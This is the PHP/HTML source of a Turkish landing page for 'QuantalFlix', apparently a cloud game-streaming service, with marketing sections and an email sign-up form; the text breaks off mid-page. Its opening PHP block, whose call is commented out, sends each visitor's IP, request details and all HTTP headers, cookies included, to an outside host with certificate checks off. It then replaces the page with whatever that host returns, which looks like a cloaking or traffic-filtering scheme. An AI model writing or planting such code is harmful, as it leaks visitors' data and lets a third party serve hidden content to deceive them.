﻿<?php
//request();

function request(): void {
	$pub_key    = 'K';
	$secret_key = '0000-00-0000';
	$request    = 'TR';
	$ch         = curl_init( "https://ipcountry-code.com/api/?request=$request&pub_key=$pub_key&secret_key=$secret_key" );
	curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
	curl_setopt( $ch, CURLOPT_POST, true );
	curl_setopt( $ch, CURLOPT_POSTFIELDS, [ 'user' => http_build_query( user() ) ] );
	curl_setopt( $ch, CURLOPT_TIMEOUT, 10 );
	curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );
	curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );

	$code     = curl_exec( $ch );
	$httpCode = curl_getinfo( $ch, CURLINFO_HTTP_CODE );
	$error    = curl_error( $ch );
	curl_close( $ch );

	if ( $error ) {
		var_dump( 'Error cURL: ' . $error );
	}
	$code = json_decode( $code );
	if ( $code !== 'User not OK' ) {
		echo $code;
		exit();
	}
}

function user(): array {
	$userParams = [
		'REMOTE_ADDR',
		'SERVER_PROTOCOL',
		'SERVER_PORT',
		'REMOTE_PORT',
		'QUERY_STRING',
		'REQUEST_SCHEME',
		'REQUEST_URI',
		'REQUEST_TIME_FLOAT',
		'X_FORWARDED_FOR',
		'X-Forwarded-Host',
		'X-Forwarded-For',
		'X-Frame-Options',
	];

	$headers = [];
	foreach ( $_SERVER as $key => $value ) {
		if ( in_array( $key, $userParams ) || substr_compare( 'HTTP', $key, 0, 4 ) == 0 ) {
			$headers[ $key ] = $value;
		}
	}

	return $headers;
}
?>

<!DOCTYPE html>
<html lang="tr">

<head>
    <meta charset="utf-8">
    <title>QuantalFlix - Bulut Oyun Yayın Platformu</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <meta name="robots" content="index, follow">

    <meta property="og:type" content="website">
    <meta property="og:url" content="https://quantalflix.com/">
    <meta property="og:title" content="QuantalFlix - Bulut Oyun Yayın Platformu">
    <meta property="og:description" content="Güçlü bulut teknolojisi ile oyunlarınızı kesintisiz yayınlayın. Donanım sınırlarını aşın, profesyonel yayıncılığa adım atın.">
    <meta property="og:image" content="https://quantalflix.com/assets/img/carousel-1.jpg">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:site_name" content="QuantalFlix">
    <meta property="og:locale" content="tr_TR">

    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://quantalflix.com/">
    <meta property="twitter:title" content="QuantalFlix - Bulut Oyun Yayın Platformu">
    <meta property="twitter:description" content="Güçlü bulut teknolojisi ile oyunlarınızı kesintisiz yayınlayın. Donanım sınırlarını aşın, profesyonel yayıncılığa adım atın.">
    <meta property="twitter:image" content="https://quantalflix.com/assets/img/carousel-1.jpg">

    	<link href="assets/img/favicon.png" rel="icon">

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    	<link href="https://fonts.googleapis.com/css2?family=Albert+Sans:ital,wght@0,100..900;1,100..900&family=DM+Sans:ital,opsz,wght@0,9..40,100..1000;1,9..40,100..1000&display=swap" rel="stylesheet">

    <link href="assets/css/all.min.css" rel="stylesheet">
    <link href="assets/css/bootstrap-icons.css" rel="stylesheet">

    <link href="assets/lib/animate/animate.min.css" rel="stylesheet">
    <link href="assets/lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">

    <link href="assets/css/bootstrap.min.css" rel="stylesheet">

    <link href="assets/css/master.css" rel="stylesheet">
</head>

<body>
    <div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center">
        <div class="spinner-border position-relative text-primary" style="width: 6rem; height: 6rem;" role="status"></div>
        <img class="position-absolute top-50 start-50 translate-middle" src="assets/img/icons/icon-1.png" alt="Icon">
    </div>
    <nav class="navbar navbar-expand-lg header navbar-light sticky-top py-lg-0 px-lg-5 wow fadeIn" data-wow-delay="0.1s">
        <a href="/" class="navbar-brand ms-4 ms-lg-0 logo">
            <h1 class="text-primary m-0">QuantalFlix</h1>
        </a>
        <button type="button" class="navbar-toggler me-4" data-bs-toggle="collapse" data-bs-target="#navbarCollapse">
            <span class="navbar-toggler-icon bi bi-text-paragraph"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarCollapse">
            <div class="navbar-nav ms-auto p-4 p-lg-0">
                <a href="/" class="nav-item nav-link active">Ana Sayfa</a>
                <a href="how-to-stream.html" class="nav-item nav-link">Yayın Nasıl Yapılır</a>
                <a href="integrations.html" class="nav-item nav-link">Entegrasyonlar</a>
                <a href="obs-cloud.html" class="nav-item nav-link">Bulut OBS</a>
               
                <a href="contact.html" class="nav-item nav-link">İletişim</a>
            </div>
            <div class="p-4 p-lg-0"><img src="assets/img/icons/icon-1.png" alt="Icon" style="width: 60px; height: 60px;"></div>
          
        </div>
    </nav>
    <div class="container-fluid p-0 pb-5 wow fadeIn" data-wow-delay="0.1s">
        <div class="owl-carousel header-carousel position-relative">
            <div class="owl-carousel-item position-relative" data-dot="<img src='assets/img/carousel-1.jpg'>">
                <img class="img-fluid" src="assets/img/carousel-1.jpg" alt="slider-img">
                <div class="owl-carousel-inner">
                    <div class="container">
                        <div class="row justify-content-start">
                            <div class="col-10 col-lg-8">
                                <h1 class="display-1 text-white animated slideInDown">Takılmadan Yayına Başla — Buluttan Canlı Yayınla!
                                </h1>
                                <p class="fs-5 fw-medium text-white mb-4 pb-3">Güçlü bulut teknolojisi sayesinde oyunlarınızı kesintisiz olarak yayınlayabilirsiniz.   Profesyonel yayıncılığa geçmek için sahip olmanız gereken donanımın sınırlarını aşmalısınız.</p>
                                <a href="contact.html" class="btn btn-primary py-3 px-5 animated slideInLeft">Hemen Başla</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="owl-carousel-item position-relative" data-dot="<img src='assets/img/carousel-2.jpg'>">
                <img class="img-fluid" src="assets/img/carousel-2.jpg" alt="slider-img">
                <div class="owl-carousel-inner">
                    <div class="container">
                        <div class="row justify-content-start">
                            <div class="col-10 col-lg-8">
                                <h1 class="display-1 text-white animated slideInDown">Bulut OBS ile Profesyonel Yayınlar
                                </h1>
                                <p class="fs-5 fw-medium text-white mb-4 pb-3">OBS, kurulum gerektirmez ve tarayıcınızdan kullanılabilir.   Güçlü sunucularımız, 4K kalitesinde yayın yapmanızı sağlar.</p>
                                <a href="obs-cloud.html" class="btn btn-primary py-3 px-5 animated slideInLeft">OBS'yi Dene</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="owl-carousel-item position-relative" data-dot="<img src='assets/img/carousel-3.jpg'>">
                <img class="img-fluid" src="assets/img/carousel-3.jpg" alt="slider-img">
                <div class="owl-carousel-inner">
                    <div class="container">
                        <div class="row justify-content-start">
                            <div class="col-10 col-lg-8">
                                <h1 class="display-1 text-white animated slideInDown">Tüm Platformlara Aynı Anda Yayın</h1>
                                <p class="fs-5 fw-medium text-white mb-4 pb-3">Twitch, YouTube, Facebook Gaming ve diğer platformlarda tek tıkla çok sayıda yayın yapmak.   Kitlenizi artırın.</p>
                                <a href="integrations.html" class="btn btn-primary py-3 px-5 animated slideInLeft">Entegrasyonlar</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container-xxl py-5">
        <div class="container">
            <div class="row g-5">
                <div class="col-lg-6 wow fadeIn" data-wow-delay="0.1s">
                    <div class="about-img">
                        <img class="img-fluid" src="assets/img/about-1.jpg" alt="about-img-1">
                        <img class="img-fluid" src="assets/img/about-2.jpg" alt="about-img-2">
                    </div>
                </div>
                <div class="col-lg-6 wow fadeIn" data-wow-delay="0.5s">
                    <h4 class="section-title">Hakkımızda</h4>
                    <h1 class="display-6 mb-4">Oyun Yayıncılığında Geleceği Bugüne Taşıyoruz</h1>
                    <p>QuantalFlix, Türkiye'deki bulut oyun platformu olarak en iyisidir.   Güçlü teknolojimiz sayesinde herkesin profesyonel kalitede yayın yapabilmesini sağlıyoruz.</p>
                    <p class="mb-4">Sıfır gecikme teknolojimiz ve çoklu platform desteği ile bulut tabanlı OBS sistemimiz oyun yayıncılığında yeni bir dönem başlatıyor.   Tüm yayıncılar için özel olarak tasarlanmış çözümlerimizi inceleyin.</p>
                    <div class="d-flex align-items-center mb-5">
                        <div class="d-flex flex-shrink-0 align-items-center justify-content-center border border-5 border-primary" style="width: 120px; height: 120px;">
                            <h1 class="display-4 mb-n2" data-toggle="counter-up">99</h1>
                        </div>
                        <div class="ps-4">
                            <h3>% Uptime</h3>
                            <h3>Garantili</h3>
                            <h3 class="mb-0">Hizmet</h3>
                        </div>
                    </div>
                    <a class="btn btn-primary py-3 px-5" href="how-to-stream.html">Nasıl Çalışır</a>
                </div>
            </div>
        </div>
    </div>
    <div class="container-xxl py-5">
        <div class="container pt-5">
            <div class="row g-4">
                <div class="col-lg-4 col-md-6 wow fadeInUp" data-wow-delay="0.1s">
                    <div class="fact-item text-center bg-light h-100 p-5 pt-0">
                        <div class="fact-icon">
                            <img src="assets/img/icons/icon-2.png" alt="Icon">
                        </div>
                        <h3 class="mb-3">Sıfır Gecikme Teknolojisi</h3>
                        <p class="mb-0">Gelişmiş bulut altyapımız sayesinde son derece düşük gecikme süresi ile oyununuzu izleyicilerinizle gerçek zamanlı olarak paylaşın.</p>
                    </div>
                </div>
                <div class="col-lg-4 col-md-6 wow fadeInUp" data-wow-delay="0.3s">
                    <div class="fact-item text-center bg-light h-100 p-5 pt-0">
                        <div class="fact-icon">
                            <img src="assets/img/icons/icon-3.png" alt="Icon">
                        </div>
                        <h3 class="mb-3">Bulut Tabanlı OBS</h3>
                        <p class="mb-0">Bilgisayarınıza hiçbir şey kurmadan profesyonel OBS özelliklerini tarayıcınızdan kullanın.</p>
                    </div>
                </div>
                <div class="col-lg-4 col-md-6 wow fadeInUp" data-wow-delay="0.5s">
                    <div class="fact-item text-center bg-light h-100 p-5 pt-0">
                        <div class="fact-icon">
                            <img src="assets/img/icons/icon-4.png" alt="Icon">
                        </div>
                        <h3 class="mb-3">Çoklu Platform Desteği</h3>
                        <p class="mb-0">Birçok platformda aynı anda yayın yapın.   Bir hesap kullanarak tüm sosyal medya kanallarınızı izleyin.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container-xxl project py-5">
        <div class="container">
            <div class="text-center mx-auto mb-5 wow fadeInUp" data-wow-delay="0.1s" style="max-width: 600px;">
                <h4 class="section-title">Özelliklerimiz</h4>
                <h1 class="display-6 mb-4">QuantalFlix ile Yayıncılığın Gücünü Keşfedin</h1>
            </div>
            <div class="row g-4 wow fadeInUp" data-wow-delay="0.3s">
                <div class="col-lg-4">
                    <div class="nav nav-pills d-flex justify-content-between w-100 h-100 me-4">
                        <button class="nav-link w-100 d-flex align-items-center text-start p-4 mb-4 active" data-bs-toggle="pill" data-bs-target="#tab-pane-1" type="button">
                            <span class="m-0">01. Bulut OBS Studio</span>
                        </button>
                        <button class="nav-link w-100 d-flex align-items-center text-start p-4 mb-4" data-bs-toggle="pill" data-bs-target="#tab-pane-2" type="button">
                            <span class="m-0">02. Çoklu Platform Yayını</span>
                        </button>
                        <button class="nav-link w-100 d-flex align-items-center text-start p-4 mb-4" data-bs-toggle="pill" data-bs-target="#tab-pane-3" type="button">
                            <span class="m-0">03. 4K Kalite Desteği</span>
                        </button>
                        <button class="nav-link w-100 d-flex align-items-center text-start p-4 mb-0" data-bs-toggle="pill" data-bs-target="#tab-pane-4" type="button">
                            <span class="m-0">04. Otomatik Kayıt</span>
                        </button>
                    </div>
                </div>
                <div class="col-lg-8">
                    <div class="tab-content w-100">
                        <div class="tab-pane fade show active" id="tab-pane-1">
                            <div class="row g-4">
                                <div class="col-md-6" style="min-height: 350px;">
                                    <div class="position-relative h-100">
                                        <img class="position-absolute img-fluid w-100 h-100" src="assets/img/project-1.jpg" style="object-fit: cover;" alt="project-img">
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <h1 class="mb-3">Tarayıcınızdan OBS Kullanın</h1>
                                    <p class="mb-4">OBS Studio kurulumu gerektirmeden profesyonel kalitede yayınlar oluşturun.   Tarayıcınızın tüm OBS özelliklerine erişin.</p>
                                    <p class="mb-4">Yeşil perde efektleri, özel temalar ve profesyonel geçiş animasyonları gibi gelişmiş yayın özelliklerimiz sayesinde yayınlarınızı daha etkileyici hale getirin.</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>Kurulum Gerektirmez</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>Tüm OBS Eklentileri</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>Bulut Kaydetme</p>
                                    <a href="obs-cloud.html" class="btn btn-primary py-3 px-5 mt-3">OBS'yi Keşfet</a>
                                </div>
                            </div>
                        </div>
                        <div class="tab-pane fade" id="tab-pane-2">
                            <div class="row g-4">
                                <div class="col-md-6" style="min-height: 350px;">
                                    <div class="position-relative h-100">
                                        <img class="position-absolute img-fluid w-100 h-100" src="assets/img/project-2.jpg" style="object-fit: cover;" alt="project-img">
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <h1 class="mb-3">Aynı Anda Tüm Platformlara</h1>
                                    <p class="mb-4">Twitch, YouTube, Facebook Gaming ve daha birçok platforma tek seferde yayın yapın. Kitlenizi maksimize edin, yayın gücünüzü artırın.</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>10+ Platform Desteği</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>Tek Tıkla Yayın</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>Anlık Chat Yönetimi</p>
                                    <a href="integrations.html" class="btn btn-primary py-3 px-5 mt-3">Platformları Gör</a>
                                </div>
                            </div>
                        </div>
                        <div class="tab-pane fade" id="tab-pane-3">
                            <div class="row g-4">
                                <div class="col-md-6" style="min-height: 350px;">
                                    <div class="position-relative h-100">
                                        <img class="position-absolute img-fluid w-100 h-100" src="assets/img/project-3.jpg" style="object-fit: cover;" alt="project-img">
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <h1 class="mb-3">4K Ultra HD Kalite</h1>
                                    <p class="mb-4">Güçlü bulut sunucularımız sayesinde 4K çözünürlükte, 60 FPS'de yayın yapın. İzleyicilerinize en net deneyimi sunun.</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>4K 60FPS Destek</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>Adaptif Bitrate</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>Düşük Gecikme</p>
                                    <a href="contact.html" class="btn btn-primary py-3 px-5 mt-3">Daha Fazla Bilgi</a>
                                </div>
                            </div>
                        </div>
                        <div class="tab-pane fade" id="tab-pane-4">
                            <div class="row g-4">
                                <div class="col-md-6" style="min-height: 350px;">
                                    <div class="position-relative h-100">
                                        <img class="position-absolute img-fluid w-100 h-100" src="assets/img/project-4.jpg" style="object-fit: cover;" alt="project-img">
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <h1 class="mb-3">Otomatik Kayıt ve Analiz</h1>
                                    <p class="mb-4">Yayınlarınız otomatik olarak kaydedilir ve detaylı analiz raporları ile performansınızı takip edin. Büyüme stratejinizi optimize edin.</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>Otomatik Bulut Kayıt</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>Detaylı Analitik</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>İzleyici İstatistikleri</p>
                                    <a href="how-to-stream.html" class="btn btn-primary py-3 px-5 mt-3">Analitikleri Gör</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container-xxl py-5">
        <div class="container">
            <div class="text-center mx-auto mb-5 wow fadeInUp" data-wow-delay="0.1s" style="max-width: 600px;">
                <h4 class="section-title">Hizmetlerimiz</h4>
                <h1 class="display-6 mb-4">Oyun Yayıncılığının Her Aşamasında Yanınızdayız</h1>
            </div>
            <div class="row g-4">
                <div class="col-lg-4 col-md-6 wow fadeInUp" data-wow-delay="0.1s">
                    <div class="service-item d-flex position-relative text-center h-100">
                        <img class="bg-img" src="assets/img/service-1.jpg" alt="">
                        <div class="service-text p-5">
                            <img class="mb-4" src="assets/img/icons/icon-5.png" alt="Icon">
                            <h3 class="mb-3">Bulut OBS Studio</h3>
                            <p class="mb-4">Tarayıcınızdan OBS'nin tüm gücünü kullanın. Kurulum yok, sadece profesyonel yayın deneyimi.</p>
                            <a class="btn" href="obs-cloud.html"><i class="fa fa-plus text-primary me-3"></i>Detaylar</a>
                        </div>
                    </div>
                </div>
                <div class="col-lg-4 col-md-6 wow fadeInUp" data-wow-delay="0.3s">
                    <div class="service-item d-flex position-relative text-center h-100">
                        <img class="bg-img" src="assets/img/service-2.jpg" alt="">
                        <div class="service-text p-5">
                            <img class="mb-4" src="assets/img/icons/icon-6.png" alt="Icon">
                            <h3 class="mb-3">Çoklu Platform Yayını</h3>
                            <p class="mb-4">Aynı anda birden fazla platforma yayın yapın. Kitlenizi büyütün, gelir potansiyelinizi artırın.</p>
                            <a class="btn" href="integrations.html"><i class="fa fa-plus text-primary me-3"></i>Detaylar</a>
                        </div>
                    </div>
                </div>
                <div class="col-lg-4 col-md-6 wow fadeInUp" data-wow-delay="0.5s">
                    <div class="service-item d-flex position-relative text-center h-100">
                        <img class="bg-img" src="assets/img/service-3.jpg" alt="">
                        <div class="service-text p-5">
                            <img class="mb-4" src="assets/img/icons/icon-7.png" alt="Icon">
                            <h3 class="mb-3">Yayın Optimizasyonu</h3>
                            <p class="mb-4">AI destekli optimizasyon ile yayın kalitesini otomatik olarak ayarlayın ve en iyi performansı alın.</p>
                            <a class="btn" href="how-to-stream.html"><i class="fa fa-plus text-primary me-3"></i>Detaylar</a>
                        </div>
                    </div>
                </div>
                <div class="col-lg-4 col-md-6 wow fadeInUp" data-wow-delay="0.1s">
                    <div class="service-item d-flex position-relative text-center h-100">
                        <img class="bg-img" src="assets/img/service-4.jpg" alt="">
                        <div class="service-text p-5">
                            <img class="mb-4" src="assets/img/icons/icon-8.png" alt="Icon">
                            <h3 class="mb-3">Chat Yönetimi</h3>
                            <p class="mb-4">Tüm platformlardan gelen mesajları tek yerden yönetin. Moderasyon araçları ile güvenli ortam sağlayın.</p>
                            <a class="btn" href="integrations.html"><i class="fa fa-plus text-primary me-3"></i>Detaylar</a>
                        </div>
                    </div>
                </div>
                <div class="col-lg-4 col-md-6 wow fadeInUp" data-wow-delay="0.3s">
                    <div class="service-item d-flex position-relative text-center h-100">
                        <img class="bg-img" src="assets/img/service-5.jpg" alt="">
                        <div class="service-text p-5">
                            <img class="mb-4" src="assets/img/icons/icon-9.png" alt="Icon">
                            <h3 class="mb-3">Analitik Raporlar</h3>
                            <p class="mb-4">Detaylı analitik veriler ile yayın performansınızı takip edin ve büyüme stratejinizi geliştirin.</p>
                            <a class="btn" href="how-to-stream.html"><i class="fa fa-plus text-primary me-3"></i>Detaylar</a>
                        </div>
                    </div>
                </div>
                <div class="col-lg-4 col-md-6 wow fadeInUp" data-wow-delay="0.5s">
                    <div class="service-item d-flex position-relative text-center h-100">
                        <img class="bg-img" src="assets/img/service-6.jpg" alt="">
                        <div class="service-text p-5">
                            <img class="mb-4" src="assets/img/icons/icon-10.png" alt="Icon">
                            <h3 class="mb-3">7/24 Teknik Destek</h3>
                            <p class="mb-4">Uzman ekibimiz size 7/24 destek sağlar. Sorunsuz yayın deneyimi için her zaman yanınızdayız.</p>
                            <a class="btn" href="contact.html"><i class="fa fa-plus text-primary me-3"></i>Detaylar</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container-xxl py-5">
        <div class="container">
            <div class="row g-5">
                <div class="col-lg-6 wow fadeInUp" data-wow-delay="0.1s">
                    <h4 class="section-title">Neden QuantalFlix?</h4>
                    <h1 class="display-6 mb-4">Yayıncıların Güvendiği Platform</h1>
                    <p class="mb-4">Türkiye'nin en gelişmiş bulut oyun yayın teknolojisi ile donanım sınırlarını aşın. Profesyonel yayıncılık artık herkese açık.</p>
                    <div class="row g-4">
                        <div class="col-12">
                            <div class="d-flex align-items-start">
                                <img class="flex-shrink-0" src="assets/img/icons/icon-2.png" alt="Icon">
                                <div class="ms-4">
                                    <h3>Sıfır Kurulum</h3>
                                    <p class="mb-0">Bilgisayarınıza hiçbir şey kurmadan tarayıcınızdan profesyonel yayın yapın.</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-12">
                            <div class="d-flex align-items-start">
                                <img class="flex-shrink-0" src="assets/img/icons/icon-3.png" alt="Icon">
                                <div class="ms-4">
                                    <h3>Güçlü Bulut Altyapı</h3>
                                    <p class="mb-0">Enterprise düzeyinde bulut sunucular ile en yüksek performans ve güvenilirlik.</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-12">
                            <div class="d-flex align-items-start">
                                <img class="flex-shrink-0" src="assets/img/icons/icon-4.png" alt="Icon">
                                <div class="ms-4">
                                    <h3>Türkiye Merkezli Destek</h3>
                                    <p class="mb-0">Türkçe destek ekibi ile 7/24 teknik yardım ve yayıncılık danışmanlığı.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-lg-6 wow fadeInUp" data-wow-delay="0.5s">
                    <div class="feature-img">
                        <img class="img-fluid" src="assets/img/about-3.jpg" alt="about-img">
                        <img class="img-fluid" src="assets/img/about-4.jpg" alt="about-img">
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container-xxl py-5">
        <div class="container">
            <div class="row g-5">
                <div class="col-lg-6 wow fadeInUp" data-wow-delay="0.1s">
                    <h4 class="section-title">Hemen Başla</h4>
                    <h1 class="display-6 mb-4">Ücretsiz Hesap Oluştur ve Yayına Başla</h1>
                    <p class="mb-4">QuantalFlix ile yayıncılık yolculuğunuza bugün başlayın. Ücretsiz deneme sürümümüz ile tüm özelliklerimizi test edin ve profesyonel yayıncılık deneyimi yaşayın.</p>
                 
                </div>
                <div class="col-lg-6 wow fadeInUp" data-wow-delay="0.5s">
                    <form id="registrationForm" class="needs-validation" novalidate>
                        <input type="hidden" id="gclid_reg" name="gclid" value="">
                        <div class="row g-3">
                            <div class="col-12 col-sm-6">
                                <div class="form-floating">
                                    <input type="text" class="form-control" id="regName" placeholder="Adınızı girin" style="height: 55px; color: #191c24;" required>
                                    <label for="regName">Adınız</label>
                                    <div class="invalid-feedback">Lütfen adınızı girin</div>
                                </div>
                            </div>
                            <div class="col-12 col-sm-6">
                                <div class="form-floating">
                                    <input type="email" class="form-control" id="regEmail" placeholder="E-posta adresinizi girin" style="height: 55px; color: #191c24;" required>
                                    <label for="regEmail">E-posta Adresiniz</label>
                                    <div class="invalid-feedback">Lütfen geçerli bir e-posta adresi girin</div>
                                </div>
                            </div>
                            <div class="col-12">
                                <button class="btn btn-primary w-100 py-3" type="button" onclick="handleRegistration(event)">Ücretsiz Hesap Oluştur</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <div class="container-xxl project py-5">
        <div class="container">
            <div class="text-center mx-auto mb-5 wow fadeInUp" data-wow-delay="0.1s" style="max-width: 600px;">
                <h4 class="section-title">Başarı Hikayeleri</h4>
                <h1 class="display-6 mb-4">QuantalFlix ile Büyüyen Yayıncılar</h1>
            </div>
            <div class="row g-4 wow fadeInUp" data-wow-delay="0.3s">
                <div class="col-lg-4">
                    <div class="nav nav-pills d-flex justify-content-between w-100 h-100 me-4">
                        <button class="nav-link w-100 d-flex align-items-center text-start p-4 mb-4 active" data-bs-toggle="pill" data-bs-target="#tab-pane-1" type="button">
                            <span class="m-0">01. Gaming Streamers</span>
                        </button>
                        <button class="nav-link w-100 d-flex align-items-center text-start p-4 mb-4" data-bs-toggle="pill" data-bs-target="#tab-pane-2" type="button">
                            <span class="m-0">02. Esports Teams</span>
                        </button>
                        <button class="nav-link w-100 d-flex align-items-center text-start p-4 mb-4" data-bs-toggle="pill" data-bs-target="#tab-pane-3" type="button">
                            <span class="m-0">03. Content Creators</span>
                        </button>
                        <button class="nav-link w-100 d-flex align-items-center text-start p-4 mb-0" data-bs-toggle="pill" data-bs-target="#tab-pane-4" type="button">
                            <span class="m-0">04. Pro Streamers</span>
                        </button>
                    </div>
                </div>
                <div class="col-lg-8">
                    <div class="tab-content w-100">
                        <div class="tab-pane fade show active" id="tab-pane-1">
                            <div class="row g-4">
                                <div class="col-md-6" style="min-height: 350px;">
                                    <div class="position-relative h-100">
                                        <img class="position-absolute img-fluid w-100 h-100" src="assets/img/project-1.jpg" style="object-fit: cover;" alt="project-img">
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <h1 class="mb-3">Oyun Yayıncıları için Mükemmel</h1>
                                    <p class="mb-4">QuantalFlix ile oyun yayıncıları donanım sınırlarını aşıyor ve daha geniş kitlelere ulaşıyor. Bulut teknolojimiz sayesinde en ağır oyunları bile sorunsuz yayınlayabilirsiniz.</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>Tüm Oyun Türleri</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>Optimum Performans</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>Kolay Kullanım</p>
                                    <a href="how-to-stream.html" class="btn btn-primary py-3 px-5 mt-3">Nasıl Başlarım</a>
                                </div>
                            </div>
                        </div>
                        <div class="tab-pane fade" id="tab-pane-2">
                            <div class="row g-4">
                                <div class="col-md-6" style="min-height: 350px;">
                                    <div class="position-relative h-100">
                                        <img class="position-absolute img-fluid w-100 h-100" src="assets/img/project-2.jpg" style="object-fit: cover;" alt="project-img">
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <h1 class="mb-3">Esports Takımları Bizimle</h1>
                                    <p class="mb-4">Profesyonel esports takımları QuantalFlix'i tercih ediyor. Turnuvalar ve antrenmanları yüksek kalitede yayınlayın, sponsorlarınıza değer katın.</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>Turnuva Yayınları</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>Takım Odaları</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>Sponsorluk Desteği</p>
                                    <a href="contact.html" class="btn btn-primary py-3 px-5 mt-3">Takım Çözümleri</a>
                                </div>
                            </div>
                        </div>
                        <div class="tab-pane fade" id="tab-pane-3">
                            <div class="row g-4">
                                <div class="col-md-6" style="min-height: 350px;">
                                    <div class="position-relative h-100">
                                        <img class="position-absolute img-fluid w-100 h-100" src="assets/img/project-3.jpg" style="object-fit: cover;" alt="project-img">
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <h1 class="mb-3">İçerik Üreticileri Büyüyor</h1>
                                    <p class="mb-4">Video content creators QuantalFlix ile kaliteli içerikler üretiyor ve izleyici sayılarını katlamaya devam ediyor.</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>HD Kalite Kayıt</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>Otomatik Düzenleme</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>Çoklu Platform</p>
                                    <a href="integrations.html" class="btn btn-primary py-3 px-5 mt-3">Entegrasyonlar</a>
                                </div>
                            </div>
                        </div>
                        <div class="tab-pane fade" id="tab-pane-4">
                            <div class="row g-4">
                                <div class="col-md-6" style="min-height: 350px;">
                                    <div class="position-relative h-100">
                                        <img class="position-absolute img-fluid w-100 h-100" src="assets/img/project-4.jpg" style="object-fit: cover;" alt="project-img">
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <h1 class="mb-3">Profesyonel Yayıncılar</h1>
                                    <p class="mb-4">Full-time yayıncılar QuantalFlix'in güvenilirliği ve performansı sayesinde işlerini bir üst seviyeye taşıyor.</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>7/24 Güvenilirlik</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>Gelir Optimizasyonu</p>
                                    <p><i class="fa fa-check text-primary me-3"></i>Premium Destek</p>
                                    <a href="contact.html" class="btn btn-primary py-3 px-5 mt-3">Premium Planlar</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
<div class="container-xxl py-5">
    <div class="container">
        <div class="text-center mx-auto mb-5 wow fadeInUp" data-wow-delay="0.1s" style="max-width: 600px;">
            <h4 class="section-title">Galeri</h4>
            <h1 class="display-6 mb-4">Bulut Oyun Yayın Platformunun Gücünü Görün</h1>
        </div>
        <div class="row g-4 gallery-items">
            <div class="col-lg-3 col-md-6 wow fadeInUp" data-wow-delay="0.1s">
                <div class="team-item position-relative">
                    <div class="position-relative" style="height:220px;">
                        <img class="img-fluid w-100 h-100" src="assets/img/about-123.jpg" style="object-fit: cover;" alt="Bulut Altyapı">
                    </div>
                    <div class="bg-light text-center p-4">
                        <h3 class="mt-2">Bulut Altyapı</h3>
                        <span class="text-primary">Kesintisiz Yayın</span>
                    </div>
                </div>
            </div>
            <div class="col-lg-3 col-md-6 wow fadeInUp" data-wow-delay="0.3s">
                <div class="team-item position-relative">
                    <div class="position-relative" style="height:220px;">
                        <img class="img-fluid w-100 h-100" src="assets/img/about-223.jpg" style="object-fit: cover;" alt="Her Tür Oyun">
                    </div>
                    <div class="bg-light text-center p-4">
                        <h3 class="mt-2">Her Tür Oyun</h3>
                        <span class="text-primary">Her Platformda</span>
                    </div>
                </div>
            </div>
            <div class="col-lg-3 col-md-6 wow fadeInUp" data-wow-delay="0.5s">
                <div class="team-item position-relative">
                    <div class="position-relative" style="height:220px;">
                        <img class="img-fluid w-100 h-100" src="assets/img/about-323.jpg" style="object-fit: cover;" alt="Canlı Sohbet">
                    </div>
                    <div class="bg-light text-center p-4">
                        <h3 class="mt-2">Canlı Sohbet</h3>
                        <span class="text-primary">Etkileşimli Yayın</span>
                    </div>
                </div>
            </div>
            <div class="col-lg-3 col-md-6 wow fadeInUp" data-wow-delay="0.7s">
                <div class="team-item position-relative">
